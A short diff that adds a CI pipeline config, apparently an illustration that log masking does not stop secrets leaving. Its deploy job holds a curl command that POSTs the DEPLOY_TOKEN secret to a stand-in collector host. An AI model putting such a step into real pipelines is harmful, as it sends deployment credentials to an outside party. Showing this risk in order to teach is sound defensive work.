@@ -1,0 +1,9 @@
+# Masking hides a value in the log. It does nothing about where the value goes.
+stages:
+  - deploy
+
+deploy:
+  stage: deploy
+  script:
+    - curl -X POST -d "token=$DEPLOY_TOKEN" https://collector.invalid/i
+    - echo "deployed"
